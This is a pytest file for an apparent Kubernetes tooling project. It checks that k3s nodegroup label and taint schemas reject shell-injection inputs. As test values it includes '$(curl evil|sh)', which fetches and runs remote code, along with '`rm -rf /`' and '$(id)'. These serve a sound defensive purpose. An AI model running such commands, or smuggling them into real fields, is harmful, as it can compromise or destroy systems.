"""k3s nodegroup labels/taints 명령주입 차단 테스트 (B1)"""

import pytest
from pydantic import ValidationError

from drover.models.schemas import CreateK3sNodegroupRequest, UpdateK3sNodegroupRequest


class TestNodegroupLabelValidation:
    """악성 라벨 키/값이 ValidationError를 발생시키는지 확인."""

    def test_valid_labels_accepted(self):
        req = CreateK3sNodegroupRequest(name="test-ng", labels={"app": "myapp", "env": "prod"})
        assert req.labels == {"app": "myapp", "env": "prod"}

    def test_command_substitution_in_label_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x": "$(curl evil|sh)"})

    def test_backtick_in_label_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x": "`rm -rf /`"})

    def test_semicolon_in_label_key_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x;evil": "val"})

    def test_empty_label_value_accepted(self):
        req = CreateK3sNodegroupRequest(name="test-ng", labels={"key": ""})
        assert req.labels["key"] == ""

    def test_label_with_prefix_accepted(self):
        req = CreateK3sNodegroupRequest(name="test-ng", labels={"afterglow.io/role": "worker"})
        assert req.labels is not None

    def test_shell_pipe_in_label_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x": "a|b"})

    def test_newline_in_label_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x": "a\nb"})

    def test_space_in_label_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(name="test-ng", labels={"x": "a b"})


class TestNodegroupTaintValidation:
    def test_valid_taint_accepted(self):
        req = CreateK3sNodegroupRequest(
            name="test-ng",
            taints=[{"key": "gpu", "value": "true", "effect": "NoSchedule"}],
        )
        assert req.taints is not None

    def test_invalid_effect_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(
                name="test-ng",
                taints=[{"key": "gpu", "value": "true", "effect": "BadEffect"}],
            )

    def test_command_in_taint_key_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(
                name="test-ng",
                taints=[{"key": "$(evil)", "value": "v", "effect": "NoSchedule"}],
            )

    def test_command_in_taint_value_rejected(self):
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(
                name="test-ng",
                taints=[{"key": "gpu", "value": "$(id)", "effect": "NoSchedule"}],
            )

    def test_invalid_string_taint_rejected(self):
        # list[dict] 타입이므로 문자열 taint는 Pydantic 타입 검사에서 ValidationError 발생
        with pytest.raises(ValidationError):
            CreateK3sNodegroupRequest(
                name="test-ng",
                taints=["$(evil):NoSchedule"],
            )

    def test_all_valid_effects_accepted(self):
        for effect in ("NoSchedule", "PreferNoSchedule", "NoExecute"):
            req = CreateK3sNodegroupRequest(
                name="test-ng",
                taints=[{"key": "k", "value": "v", "effect": effect}],
            )
            assert req.taints is not None

    def test_update_inherits_same_validation(self):
        with pytest.raises(ValidationError):
            UpdateK3sNodegroupRequest(labels={"x": "$(evil)"})

    def test_update_valid_labels_accepted(self):
        req = UpdateK3sNodegroupRequest(labels={"env": "staging"})
        assert req.labels == {"env": "staging"}

    def test_update_taint_validation(self):
        with pytest.raises(ValidationError):
            UpdateK3sNodegroupRequest(taints=[{"key": "x", "value": "v", "effect": "INVALID"}])
